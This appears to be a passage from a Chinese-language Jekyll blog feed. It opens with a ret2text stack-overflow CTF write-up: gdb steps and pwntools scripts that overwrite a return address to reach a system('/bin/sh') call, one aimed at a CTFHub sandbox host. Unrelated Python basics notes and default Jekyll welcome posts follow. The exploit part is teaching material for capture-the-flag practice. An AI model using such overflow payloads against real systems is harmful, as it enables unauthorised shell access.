</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>l(L)
</code></pre></div></div>

<p>查看源代码</p>

<p>b gets可以断点到gets函数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b 6
</code></pre></div></div>

<p>在第六行添加Int3断点</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r
</code></pre></div></div>

<p>运行程序</p>

<p>第六行刚刚进入func内部，查看此时程序断下</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/1.png" alt="1" /></p>
  </li>
</ul>

<p>查看此时的信息，断点位置，反汇编查看sys的地址</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>disassemble sys
</code></pre></div></div>

<p>入口地址为0x4005b6也就是sys的地址</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>i r rbp
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p &amp;a
</code></pre></div></div>

<p>查看当前rbp 变量a的地址</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/2.png" alt="1" /></p>
  </li>
</ul>

<p>rbp的地址 ffde40  变量a的地址 ffde30</p>

<h4 id="构造payload">构造payload</h4>

<p>func的返回地址是rbp的地址+8  =  rbp+8 = 0xffde40+8 = 0xffde48</p>

<p>填充a变量直到返回地址，然后讲后面的8个字节的地址改为sys的地址0x4005b6</p>

<p>偏移地址=输入“A”引发程序崩溃，把崩溃地址写入Payload</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./ret2"</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x4005b6</span><span class="p">)</span>
<span class="c1">#payload = "A" * 10
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/3.png" alt="1" /></p>
  </li>
</ul>

<h4 id="分析栈帧异常">分析栈帧异常</h4>

<p>在溢出中，可以看到stack的分析</p>

<p>gets函数重新指向main函数时，进行了push rbp的操作</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/4.png" alt="1" /></p>
  </li>
</ul>

<p>也就是说，我们让rbp的地址，指向到sys的地址</p>

<h4 id="ctf-ret2text">CTF ret2text</h4>

<p>通过ida pro分析</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/5.png" alt="1" /></p>
  </li>
</ul>

<p>这里也可以上述例子非常的像，gets函数可以引发栈溢出漏洞
在gets函数的跟踪当中可以找到secure F5反汇编</p>

<pre><code class="language-C++">int secure()
{
  unsigned int v0; // eax
  int result; // eax
  int v2; // [rsp+8h] [rbp-8h] BYREF
  int v3; // [rsp+Ch] [rbp-4h]

  v0 = time(0LL);
  srand(v0);
  v3 = rand();
  __isoc99_scanf(&amp;unk_4008C8, &amp;v2);
  result = v2;
  if ( v3 == v2 )
    result = system("/bin/sh");
  return result;
}
</code></pre>

<p>此处也调用了/bin/sh的系统命令，也就是我们需要利用这个函数，让异常引发指向他，
需要填充垃圾数据区覆盖原本的ebp的地址，让程序指针指向rbp</p>

<p>适度添加滑块以保证覆盖地址和提高exp命中率</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">22474</span>
<span class="c1">#p = process("./pwn")
</span><span class="n">p</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x78</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4007b8</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>网上已有非常多的wp，此处给出，连接后查看路径下的flag文件
代码中，python3由于数据要求，p64要求不能直接连接str，会引发EOF错误，这里使用python2，在python2中，如果由于系统原因引发错误，此处可以尝试使用p32()</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20210604ret2textROP/6.png" alt="1" /></p>
  </li>
</ul>]]></content><author><name>true</name></author><category term="stackoverflow" /><category term="ROP" /><category term="binary" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">python notes</title><link href="http://localhost:4000/2021/05/24/python-notes.html" rel="alternate" type="text/html" title="python notes" /><published>2021-05-24T18:10:00+08:00</published><updated>2021-05-24T18:10:00+08:00</updated><id>http://localhost:4000/2021/05/24/python-notes</id><content type="html" xml:base="http://localhost:4000/2021/05/24/python-notes.html"><![CDATA[<p>[TOC]</p>

<h2 id="python基础">python基础</h2>

<h3 id="pycharm设置">pycharm设置</h3>

<p>file setting中 editor设置 font 24 code style中设置tab size 4 indent缩进4</p>

<h3 id="文件头">文件头</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span></code></pre></div></div>

<p>linux下系统的用法，告诉操作系统，使用/usr/bin/python下的</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span></code></pre></div></div>

<p>这种用法是为了防止操作系统用户没有将 python 装在默认的 /usr/bin 路径里。当系统看到这一行的时候，首先会到 env 设置里查找 python 的安装路径，再调用对应路径下的解释器程序完成操作。</p>

<p>如果没有设置env 这里的python路径就等于是写死了路径</p>

<p>windows下没有，忽略</p>

<h3 id="print">print</h3>

<p>在python2.x中使用python3.x的print函数导入<strong>__future__</strong>,包的作用是禁用python2的语句，采用python3的print</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
</code></pre></div></div>

<p>其他同理，future具有很多其他的包division/absolute_import</p>

<h3 id="python保留字">python保留字</h3>

<table>
  <thead>
    <tr>
      <th>and</th>
      <th>exec</th>
      <th>not</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>assert</td>
      <td>finally</td>
      <td>or</td>
    </tr>
    <tr>
      <td>break</td>
      <td>for</td>
      <td>pass</td>
    </tr>
    <tr>
      <td>class</td>
      <td>from</td>
      <td>print</td>
    </tr>
    <tr>
      <td>continue</td>
      <td>global</td>
      <td>raise</td>
    </tr>
    <tr>
      <td>def</td>
      <td>if</td>
      <td>return</td>
    </tr>
    <tr>
      <td>del</td>
      <td>import</td>
      <td>try</td>
    </tr>
    <tr>
      <td>elif</td>
      <td>in</td>
      <td>while</td>
    </tr>
    <tr>
      <td>else</td>
      <td>is</td>
      <td>with</td>
    </tr>
    <tr>
      <td>except</td>
      <td>lambda</td>
      <td>yield</td>
    </tr>
  </tbody>
</table>

<p>多行语句</p>

<p>使用  \   来多行</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total = item_one + \
        item_two + \
        item_three
</code></pre></div></div>

<h3 id="单行注释多行注释">单行注释多行注释</h3>

<p>#单行注释</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'''
多行注释
'''
"""
多行注释
"""
</code></pre></div></div>

<h3 id="变量赋值">变量赋值</h3>

<p>python支持int long float complex</p>

<h4 id="变量赋值切片">变量赋值切片</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="nb">str</span> <span class="c1">#完整
</span><span class="k">print</span> <span class="nb">str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="c1">#输出第一个字符串
</span><span class="k">print</span> <span class="nb">str</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mi">5</span><span class="p">]</span> <span class="c1">#输出字符串第三个到第六个
</span><span class="k">print</span> <span class="nb">str</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span> <span class="c1">#输出第三个开始
</span><span class="k">print</span> <span class="nb">str</span><span class="o">*</span><span class="mi">2</span> <span class="c1">#输出字符串两次
</span><span class="k">print</span> <span class="nb">str</span> <span class="o">+</span> <span class="s">"TEST"</span> <span class="c1">#输出连接字符串
</span></code></pre></div></div>

<h4 id="元组">元组</h4>

<p>tuple,元组无法更新，但是列表是允许更新的</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print tuple = ('run','786',678,'jokne',70.2)
</code></pre></div></div>

<p>元组中只包含一个元素时，需要在元素后面添加逗号来消除歧义</p>

<p>tuple=(50,)</p>

<p>元组可以连接,和复制</p>

<p>tup3=tup1+tup2</p>

<p>tup3=tup1 * 3               tup3=(1,2,3,1,2,3,1,2,3)</p>

<p>元组的方法（元组没有列表中的增、删、改的操作，只有查的操作</p>

<p>tuple.index(obj)  /  tuple.count(obj)</p>

<p>可以使用List转化tuple</p>

<p>tuple[0]即可访问</p>

<p>del tuple即可删除</p>

<p>tuple支持索引，L[-2]截断L[1:]</p>

<p>内置函数cmp(tup1,tup2)  计算元素个数len(tuple),max()计算最大值，min()最小值,tuple(seq)转换列表为元组</p>

<h4 id="字典">字典</h4>

<p>dict  = {}键值对，成对存在</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dict['one'] = "This is one"
print(dict['one'])  #输出键为'one' 的值
console This is one
</code></pre></div></div>

<p>tinydict = {‘name’: ‘runoob’,’code’:6734, ‘dept’: ‘sales’}</p>

<p>print tinydict.keys()  #输出所有键</p>

<p>print tinydict.values()    #输出所有值</p>

<p>dict.update(dict2)  #更新字典</p>

<p>dict.items()  以列表返回可遍历的（键，值）元组数组</p>

<h3 id="运算符">运算符</h3>

<p>次方 a**b</p>

<p>向下取整 9//2 = 4</p>

<h3 id="条件">条件</h3>

<p>if elif eles</p>

<h3 id="循环语句">循环语句</h3>

<p>while    for    while中使用for   break continue 跳出该循环，执行下一次循环, pass语句</p>

<h3 id="更新列表">更新列表</h3>

<p>list.append(‘google’)  #添加元素</p>

<h3 id="日期">日期</h3>

<p>import time</p>

<p>time.time()  #值为时间戳</p>

<p>time.localtime(time.time())</p>

<p>格式化成2016-03-20 11:45:39形式</p>

<p>print time.strftime(“%Y-%m-%d %H:%M:%S”, time.localtime())</p>

<p>格式化成Sat Mar 28 22:24:24 2016形式</p>

<p>print time.strftime(“%a %b %d %H:%M:%S %Y”, time.localtime())</p>

<p>将格式字符串转换为时间戳 a = “Sat Mar 28 22:24:24 2016”</p>

<p>print time.mktime(time.strptime(a,”%a %b %d %H:%M:%S %Y”))</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>time.sleep()推迟线程
</code></pre></div></div>

<h3 id="函数">函数</h3>

<p>def function( parameters ):</p>

<p>​	return []</p>

<p>在 python 中，strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象。</p>

<p>只能说在传递中，传不可变对象和可变对象</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
    <span class="n">a</span><span class="o">=</span><span class="mi">10</span>
<span class="n">b</span><span class="o">=</span><span class="mi">2</span>
<span class="n">change</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
<span class="mi">2</span>
</code></pre></div></div>

<p>局部变量a不能赋值b，传不可变对象的时候，a b指向了同一个int对象</p>

<p>传可变对象list，采用自带更新方法append即可</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">mylist</span><span class="p">):</span>
    <span class="n">mylist</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">return</span>
<span class="n">mylist</span><span class="o">=</span><span class="p">[</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">]</span>
<span class="n">change</span><span class="p">(</span><span class="n">mylist</span><span class="p">)</span>
</code></pre></div></div>

<p>参数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def printme(str):
	return
</code></pre></div></div>

<p>调用函数，需要填入参数</p>

<p>默认参数</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def printme(age=50):
	return
</code></pre></div></div>

<p>如果没有传递，则为默认参数</p>

<p>lambda是一个表达式</p>

<p>sum = lambda arg1,arg2:arg1+arg2</p>

<h3 id="语法糖">语法糖</h3>

<p>就相当于汉语里的成语,用更简练的言语表达较复杂的含义。在得到广泛接受的情况之下，可以提升交流的效率,语法糖就是为了避免coder出现错误并提高效率的语法层面的一种优雅的解决方案。</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
    <span class="p">...</span> 
<span class="p">}</span>
</code></pre></div></div>

<p>就是while的语法糖</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">){</span>
    <span class="p">...</span>
    <span class="nx">i</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>y+=x是y=y+x的语法糖</p>

<h3 id="继承">继承</h3>
<p>Car类是父类，Aodi是子类继承于Car,继承也可以设置其他方法,代码只需做少部分改进,类遵循驼峰命名，方法小写，私有方法加下划线</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# -*- coding: utf-8 -*-
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">Car</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"我是车"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Aodi</span><span class="p">(</span><span class="n">Car</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"奥迪车"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Bmw</span><span class="p">(</span><span class="n">Car</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"宝马车"</span><span class="p">)</span>

   <span class="k">def</span> <span class="nf">price</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
       <span class="k">print</span><span class="p">(</span><span class="s">"50万"</span><span class="p">)</span>

<span class="n">c</span> <span class="o">=</span> <span class="n">Car</span><span class="p">()</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">Aodi</span><span class="p">()</span>
<span class="n">f</span> <span class="o">=</span> <span class="n">Bmw</span><span class="p">()</span>
<span class="n">c</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">d</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">f</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
<span class="n">f</span><span class="p">.</span><span class="n">price</span><span class="p">()</span>
</code></pre></div></div>

<p>派生类，调用初始化Init方法，</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
# -*- coding: utf-8 -*-
</span><span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">Car</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">color</span><span class="o">=</span><span class="s">"绿色"</span><span class="p">):</span>
        <span class="n">Car</span><span class="p">.</span><span class="n">color</span> <span class="o">=</span> <span class="n">color</span>
        
    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"我是</span><span class="si">{</span><span class="n">Car</span><span class="p">.</span><span class="n">color</span><span class="si">}</span><span class="s">的车"</span><span class="p">)</span>

<span class="k">class</span> <span class="nc">Aodi</span><span class="p">(</span><span class="n">Car</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"我是奥迪车"</span><span class="p">)</span>
    
<span class="n">c</span> <span class="o">=</span> <span class="n">Car</span><span class="p">()</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">Aodi</span><span class="p">()</span>

<span class="n">c</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="超类">超类</h4>
<p>super() 是用来解决多重继承问题的，直接用类名调用父类方法在使用单继承的时候没问题，但是如果使用多继承，会涉及到查找顺序（MRO）、重复调用（钻石继承）等种种问题。</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Aplus(object):
    def test(self):
        print("A")

class A(Aplus):
    def test(self):
        super().test()

t = A()
t.test()
</code></pre></div></div>

<h3 id="装饰器">装饰器</h3>

<p>装饰器</p>

<p>我们可以使用@property装饰器来创建<strong>只读属性</strong>，@property装饰器会将<strong>方法</strong>转换为相同名称的<strong>只读属性</strong>,可以与所定义的属性配合使用，这样可以防止属性被修改。</p>

<p>由于python进行属性的定义时，没办法设置私有属性，因此要通过@property的方法来进行设置。这样可以隐藏属性名，让用户进行使用的时候无法随意修改。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#设置class奥特曼
</span><span class="k">class</span> <span class="nc">AoteMan</span><span class="p">:</span>
    <span class="c1">#初始化属性
</span>    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>

    <span class="c1">#设置get方法获取属性_name
</span>    <span class="k">def</span> <span class="nf">get_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">_name</span>
    
	<span class="c1">#设置set方法修改_name属性
</span>    <span class="k">def</span> <span class="nf">set_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">AoteMan</span><span class="p">(</span><span class="s">'迪迦'</span><span class="p">)</span>
<span class="c1">#new对象，传入值，迪迦，走到init初始化
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">())</span>
<span class="c1">#用get方法获取值
</span><span class="n">p</span><span class="p">.</span><span class="n">set_name</span><span class="p">(</span><span class="s">'泰罗'</span><span class="p">)</span>
<span class="c1">#set方法更新值
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">())</span>
</code></pre></div></div>

<p>用装饰器改变方法为属性</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AoteMan</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>
	<span class="c1">## 利用property装饰器将获取name方法转换为获取对象的属性
</span>    <span class="o">@</span><span class="nb">property</span>
    <span class="k">def</span> <span class="nf">get_name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">_name</span>
    <span class="c1">## 利用property装饰器将设置name方法转换为获取对象的属性
</span>    <span class="o">@</span><span class="n">get_name</span><span class="p">.</span><span class="n">setter</span>
    <span class="k">def</span> <span class="nf">set_name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">_name</span> <span class="o">=</span> <span class="n">name</span>
        
<span class="n">p</span> <span class="o">=</span> <span class="n">AoteMan</span><span class="p">(</span><span class="s">'迪迦'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">)</span>   <span class="c1">## 原 p.get_name()  , 现 p.get_name，调用属性
</span><span class="n">p</span><span class="p">.</span><span class="n">set_name</span> <span class="o">=</span> <span class="s">'泰罗'</span> <span class="c1">## 原 p.set_name('泰罗')  ,现 p.set_name = '泰罗'
</span><span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">get_name</span><span class="p">)</span>
</code></pre></div></div>

<p>装饰器setter</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Test</span><span class="p">():</span>
    <span class="o">@</span><span class="nb">property</span>
    <span class="k">def</span> <span class="nf">name</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'is running here 1'</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">title</span>
    <span class="o">@</span><span class="n">name</span><span class="p">.</span><span class="n">setter</span>
    <span class="k">def</span> <span class="nf">name</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">value</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'is running here 2'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">title</span> <span class="o">=</span> <span class="n">value</span>
    
<span class="n">t</span> <span class="o">=</span> <span class="n">Test</span><span class="p">()</span>
<span class="n">t</span><span class="p">.</span><span class="n">name</span> <span class="o">=</span> <span class="s">'123'</span>
<span class="k">print</span><span class="p">(</span><span class="n">t</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>


<span class="ow">is</span> <span class="n">running</span> <span class="n">here</span> <span class="mi">2</span>
<span class="ow">is</span> <span class="n">running</span> <span class="n">here</span> <span class="mi">1</span>
<span class="mi">123</span>
</code></pre></div></div>

<h3 id="开包闭包">开包闭包</h3>

<p>if else写法</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (strategy.equals("fast")) {
  // 快速执行
} else if (strategy.equals("normal")) {
  // 正常执行
} else if (strategy.equals("smooth")) {
  // 平滑执行
} else if (strategy.equals("slow")) {
  // 慢慢执行
}
</code></pre></div></div>

<p>多态替换，python中没有interface类，直接使用抽象类和抽象方法重写即可,以<strong>java</strong>为例</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>interface Strategy {
  void run() throws Exception;
}

class FastStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 快速执行逻辑
    }
}

class NormalStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 正常执行逻辑
    }
}

class SmoothStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 平滑执行逻辑
    }
}

class SlowStrategy implements Strategy {
    @Override
    void run() throws Exception {
        // 慢速执行逻辑
    }
}
</code></pre></div></div>

<h4 id="数组">数组</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int getDays(int month){
    if (month == 1)  return 31;
    if (month == 2)  return 29;
    if (month == 3)  return 31;
    if (month == 4)  return 30;
    if (month == 5)  return 31;
    if (month == 6)  return 30;
    if (month == 7)  return 31;
    if (month == 8)  return 31;
    if (month == 9)  return 30;
    if (month == 10)  return 31;
    if (month == 11)  return 30;
    if (month == 12)  return 31;
}
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int monthDays[12] = {31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
int getDays(int month){
    return monthDays[--month];
}
</code></pre></div></div>

<h4 id="上下文管理器">上下文管理器</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'test.txt'</span><span class="p">,</span><span class="n">mode</span><span class="o">=</span><span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
	<span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
	<span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</code></pre></div></div>
<p>fopen中，如果不是使用with时，则需要再用完文件后进行关闭，以恢复资源，而如果使用上下文，则在with后运行完毕的代码将自动回收资源，即使异常也会关闭程序，但它，没有try的异常捕获</p>

<p>其原理在于，包含方法<code class="highlighter-rouge">__enter__()</code> 和<code class="highlighter-rouge"> __exit__()</code>，支持该协议对象要实现这两个方法。也就是说，如果是自定义类则需要包含<code class="highlighter-rouge">__init__</code>以及上述2种，假设其中具有run方法</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">with</span> <span class="n">MyClass</span><span class="p">(</span><span class="s">'test'</span><span class="p">)</span> <span class="k">as</span> <span class="n">mc</span><span class="p">:</span>
	<span class="n">mc</span><span class="p">.</span><span class="n">run</span><span class="p">()</span>
</code></pre></div></div>]]></content><author><name>true</name></author><category term="python" /><category term="base" /><summary type="html"><![CDATA[[TOC]]]></summary></entry><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/2018/05/17/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2018-05-17T14:05:21+08:00</published><updated>2018-05-17T14:05:21+08:00</updated><id>http://localhost:4000/2018/05/17/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/2018/05/17/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>To add new posts, simply add a file in the <code class="highlighter-rouge">_posts</code> directory that follows the convention <code class="highlighter-rouge">YYYY-MM-DD-name-of-post.ext</code> and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name>true</name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry><entry><title type="html">Hello Jekyll</title><link href="http://localhost:4000/2017/04/18/hello-jekyll.html" rel="alternate" type="text/html" title="Hello Jekyll" /><published>2017-04-18T00:00:00+08:00</published><updated>2017-04-18T00:00:00+08:00</updated><id>http://localhost:4000/2017/04/18/hello-jekyll</id><content type="html" xml:base="http://localhost:4000/2017/04/18/hello-jekyll.html"><![CDATA[<blockquote>
  <p>Transform your plain text into static websites and blogs.</p>
</blockquote>

<h1 id="welcome">Welcome</h1>

<h2 id="welcome-1">Welcome</h2>

<h3 id="welcome-2">Welcome</h3>

<p>This site aims to be a comprehensive guide to Jekyll. We’ll cover topics such as getting your site up and running, creating and managing your content, customizing the way your site works and looks, deploying to various environments, and give you some advice on participating in the future development of Jekyll itself.</p>

